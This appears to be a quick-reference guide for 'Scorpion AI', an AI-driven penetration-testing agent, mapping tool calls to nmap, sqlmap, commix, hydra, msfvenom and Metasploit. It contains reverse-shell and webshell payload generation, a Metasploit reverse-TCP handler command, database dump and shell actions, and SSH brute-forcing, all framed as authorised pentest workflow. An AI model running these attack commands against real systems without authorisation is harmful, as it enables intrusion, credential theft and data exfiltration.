# Quick Reference: External Tools in Scorpion AI

## Direct Tool Calls (Simplest Method)

### Reconnaissance Phase
```python
# Port scanning with nmap
nmap: {"target": "192.168.1.1", "type": "default"}
nmap: {"target": "192.168.1.1", "type": "stealth"}
nmap: {"target": "192.168.1.1", "type": "vuln"}
nmap: {"target": "192.168.1.1", "type": "all-ports"}

# OSINT with theHarvester
harvester: {"domain": "example.com", "source": "all"}
harvester: {"domain": "example.com", "source": "google"}

# Directory brute-forcing
gobuster: {"target": "http://example.com", "mode": "dir"}
gobuster: {"target": "example.com", "mode": "dns"}
```

### Vulnerability Scanning
```python
# Nuclei template-based scanning
nuclei: {"target": "http://example.com", "severity": "critical,high"}
nuclei: {"target": "http://example.com", "templates": "/path/to/custom"}

# Nikto web scanner
nikto: {"target": "http://example.com", "output": "results.txt"}
```

### Exploitation Phase
```python
# SQL injection testing
sqlmap: {"url": "http://example.com/page.php?id=1", "action": "test"}
sqlmap: {"url": "http://example.com/page.php?id=1", "action": "dump"}
sqlmap: {"url": "http://example.com/page.php?id=1", "action": "shell"}

# Command injection testing
commix: {"url": "http://example.com/page.php?cmd=1", "action": "test"}
commix: {"url": "http://example.com/page.php?cmd=1", "action": "exploit"}
commix: {"url": "http://example.com/page.php?cmd=1", "action": "shell"}

# Payload generation
msfvenom: {"type": "linux", "lhost": "10.0.0.1", "lport": "4444", "output": "shell"}
msfvenom: {"type": "windows", "lhost": "10.0.0.1", "lport": "4444", "output": "payload"}
msfvenom: {"type": "php", "lhost": "10.0.0.1", "lport": "4444", "output": "webshell"}

# Password brute-forcing
hydra: {"target": "192.168.1.1", "service": "ssh", "userlist": "/path/users.txt", "passlist": "/path/pass.txt"}
```

## Advanced: Execute Command Method
For tools without wrappers or custom commands:
```python
# Custom nmap scan
execute_command: {"cmd": "nmap -sS -T2 -p- 192.168.1.1 -oN full_scan.txt", "platform": "linux"}

# Custom sqlmap with tamper scripts
execute_command: {"cmd": "sqlmap -u 'http://target.com' --tamper=space2comment,between --batch", "platform": "linux"}

# Metasploit handler
execute_command: {"cmd": "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST 10.0.0.1; set LPORT 4444; exploit'", "platform": "linux", "background": true}
```

## Tool Parameters Reference

### nmap
- **target**: IP address or hostname
- **type**: "default" | "stealth" | "vuln" | "all-ports" | "udp"

### sqlmap
- **url**: Target URL with parameter
- **action**: "test" | "dump" | "shell" | "tamper"

### harvester (theHarvester)
- **domain**: Target domain
- **source**: "all" | "google" | "bing" | "linkedin"

### hydra
- **target**: IP/hostname
- **service**: "ssh" | "ftp" | "http-post-form"
- **userlist**: Path to username wordlist
- **passlist**: Path to password wordlist

### nuclei
- **target**: Target URL
- **severity**: "critical" | "high" | "medium" | "low" (comma-separated)
- **templates**: Path to custom templates (optional)

### commix
- **url**: Target URL with parameter
- **action**: "test" | "exploit" | "shell"

### msfvenom
- **type**: "linux" | "windows" | "php" | "jsp" | "encoded"
- **lhost**: Attacker IP
- **lport**: Listener port
- **output**: Output filename (without extension)

### gobuster
- **target**: Target URL or domain
- **wordlist**: Path to wordlist (optional, uses default)
- **mode**: "dir" | "dns" | "vhost"

### nikto
- **target**: Target URL
- **output**: Output filename

## Error Handling

If a tool is not installed, you'll see:
```json
{
  "error": "nmap not installed",
  "suggestion": "Install nmap or use built-in Scorpion tools",
  "tool": "nmap"
}
```

The AI will automatically fallback to built-in Scorpion tools.

## Best Practices

### Phase 1: Reconnaissance
1. Start with nmap for port scanning
2. Use theHarvester for OSINT
3. Use gobuster/dirb for web enumeration

### Phase 2: Vulnerability Detection
1. Use nuclei for template-based scanning
2. Use nikto for web server vulns
3. Use built-in Scorpion scanners

### Phase 3: Exploitation
1. Use sqlmap for SQL injection
2. Use commix for command injection
3. Use msfvenom for payload generation
4. Use hydra for brute-forcing

### Phase 4: Post-Exploitation
1. Use built-in Scorpion post-exploit modules
2. Use execute_command for custom tools

## Troubleshooting

**Q: Tool not found error?**
A: Install the tool on your system or let AI use built-in Scorpion tools

**Q: Tool hangs or timeout?**
A: Use built-in Scorpion tools which have better timeout handling

**Q: Permission denied errors?**
A: Some tools (like nmap SYN scan) require root/admin privileges

**Q: Want to use a tool not listed?**
A: Use execute_command with full command syntax

## Installation Commands

```bash
# Debian/Ubuntu
sudo apt install nmap sqlmap nikto hydra gobuster nuclei

# Install theHarvester
pip install theHarvester

# Install commix
git clone https://github.com/commixproject/commix.git
cd commix
python setup.py install

# Install Metasploit (includes msfvenom)
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall
```

## Examples in Context

### Example 1: Full Web App Pentest
```python
# Phase 1: Recon
nmap: {"target": "example.com", "type": "default"}
harvester: {"domain": "example.com", "source": "all"}
gobuster: {"target": "http://example.com", "mode": "dir"}

# Phase 2: Vulnerability Scanning
nuclei: {"target": "http://example.com", "severity": "critical,high"}
nikto: {"target": "http://example.com", "output": "nikto.txt"}

# Phase 3: Exploitation
sqlmap: {"url": "http://example.com/page.php?id=1", "action": "test"}
commix: {"url": "http://example.com/admin.php?cmd=1", "action": "exploit"}
```

### Example 2: Network Pentest
```python
# Phase 1: Discovery
nmap: {"target": "192.168.1.0/24", "type": "default"}

# Phase 2: Service Enumeration
nmap: {"target": "192.168.1.50", "type": "vuln"}

# Phase 3: Brute Force
hydra: {"target": "192.168.1.50", "service": "ssh"}
```

### Example 3: CTF/Bug Bounty
```python
# Quick recon
harvester: {"domain": "target.com", "source": "all"}
nuclei: {"target": "http://target.com", "severity": "critical,high"}

# Quick wins
sqlmap: {"url": "http://target.com/search?q=test", "action": "test"}
```
